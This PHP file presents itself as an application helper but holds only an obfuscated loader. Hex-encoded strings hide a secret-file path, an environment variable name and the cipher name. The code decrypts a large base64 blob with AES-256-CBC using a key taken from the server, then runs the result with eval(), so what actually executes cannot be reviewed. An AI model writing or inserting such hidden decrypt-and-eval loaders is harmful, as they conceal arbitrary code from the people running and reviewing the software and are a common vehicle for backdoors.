<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('IvcplmaMRi+72xDrATwPgg==');

$c=base64_decode(

'NfiQ/xc4yuHDfCrPwuisES7gTNHuGAPg+xSHPPSfdPesHFGrDiVsM6jodSGcHOYduqkP8JnYeWaN' .
'se31dBd2EUgTXHPPDB6bE4QL8DeXTYvOFVTL2Yfogbd54Fn3CqtQu8iSpygmY7/oRtIabI24LRS7' .
'Km6N0ilWXBKLhMWCdhkGr7R05s5ah5F2KbR219+5n6Ly+z+NTck0BwMe14XwimKr1u9N+cauZDrJ' .
'7cVPSYk2mP6iNZZNqTnRkYh+Ck6PxfDGdhsdaVdZYnbHvDDWkprjZf4lr5VEp6UrUay8bDGk9mPu' .
'KcX1tb4MxkfrxMRxpW1Zu9iR9ca0cWsR5LAbOMnNRfsG6ftFqlDecBPnGVGA6xYhuuZU+bIs3YA3' .
'BEqnQ6w5AyaPpoJyb+yBD7vBVhmSm5FrVKhfEZAgBnsflZ+IU3U1DpowU1WLCDlP3yISLPKVqfVb' .
'2xhvrzlx+n1t1nT6kahz6X6RNE9No9J6UvGniIfY+b3M7+zKQlJN0xPWifl8k1inotN3lgHaNypA' .
'lX5WJWgTG+5wNoIGk6yrc5XaIlIoDC6VVkFEV/4b9WqWlH1UJBPzcTDJBHhJj4w2y/F+JDzK0yCq' .
'PPOGjpwsi1ndGzgFp/1l6FlvRbH/Q0UhritXdXPeaMmou2xfxf7/HKbKgl412oLDPcjHY+ffLetO' .
'SdkOT83Ej/uD2gVObMSDlTDUBBqNK7Fv/rldliY+QFc5iTv7APCHhRb5ztZa0+TuRXDWudEe2bnl' .
'h7A9aONYWo0uB3ZgZw3FQ1OR3uPFx9W5mmpnBpKbuJYk1YRWOYTBFRW98AxnhdUWnvQ8N3i8h1GB' .
'mMJPgWHsRqGgVCLbC7iSCN2jLv26Epa6mtzKOT71ZkKyBfR0vYmRcwRzMPr1bve305FwK3qQu7LD' .
'j0HT4ScBDuEZ2W/PpoOdL5J8WNhaPKXhoasjf7d09Vu8i/ch9BlEyDalEYA2RnYyz9D1lqgn4Ww9' .
'1Rn1joHzTpFLC6NUj68dwRYGrDu1FKSvOtDGBYkmIE7NOJDqBAFA1Y2FyKJnzWMEHDBNK88GRwBI' .
'iFyB1sR/xL3WZLnjBGfTQDF3/iqj0LamzFrAUr4C0t8jnQJmEn+GvX+3oyHyZGPyTn9OrOrbj+Xg' .
'JvG6p6TIeynZKt6w8PIQUBTl+l0iipSwOe6oeL1WxDXbeLc+yaVaEqCQ8PE8VObDAbXcwH6dpVpR' .
'rsFMXAwzQh4bvIS0I+AS92ezsG6cawMD3Kn66ptMqKlZEBZkvijopF6aNuD4Gbev7z+JAMxr/H7/' .
'BeROLsGlnRMMooaCnIa6MVNoxOroxtKDfqhZ9TPZLyVL33UNik7aCWdX0IybX3qenW6wUP7ipL1O' .
'jQdX08FNkj2rrhYFZ8wKSpcd/zjEhrrglCyQpuQCpCTTnbDvbBkLTaZUteeaqzC7PhpsoE572LP5' .
'YLmq1O2bBbvh9h3G2us1sM1rb3TsLXaiDLUinKOe9ZOofuInEBosEHL+VS8iwSc++4tR4x7kDQSQ' .
'iwFzxqX6FJfEC3D8eFYOO9P+20/cTaTLBjudsHCTe3Ie3b1+VJGG8Zw2wq9mj1FSjg/G1BcCnY88' .
'uegh0bvd4y/SMDXAoD8t92U4+JZSgNgPbLh7IX93gg9tyZxOyJpDtDjIWL4toLHxT8iJC3bUOAbf' .
'qygNKvX43LE7p4Yxyb2Oy2S7PXtcA9V6xRbEDM4IZHOovV//3kBSg3mLhyLf0rW1BWMA+W/k7hYw' .
'OtFIogjDtqb+zDMNFIsvzaty+lvnJAOHFG+skpJr8xZ1FxbUuyjBGhI/ooboEKbnPGC2lQC97PxF' .
'JAiT6URShhLI3Lidj57kpypasVQ7aUIZSGLwpE9c5BlA/KNnApJzd9CXOfulgsdpnV+eU/9yYj4n' .
'VOOK7mD9dRzjIw0sF1fkvxeQ0CQDdhWiTHRiFFRAY0Te8bGp1lqLCJqjAGyKuMeow8V7U+gyO65/' .
'4CJocnY0Dm/YlQKEIWoZzT+07NzDUBdjgrujNIC9sg+tO84Q/G60rFTcWwe6pQSrLNiKImPR95qn' .
'XYL475cjI6A6MMD+dp0IcDLwVZaMyhaKpk/ChMHSgQMJoDsJvTkq/94Bk3FXN3IpK7kFtomsEwWF' .
'mNYQeHPNRtDiC+AhK8wHf4vfbssVs7CJ7if4bDnvTZlBjMT5'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

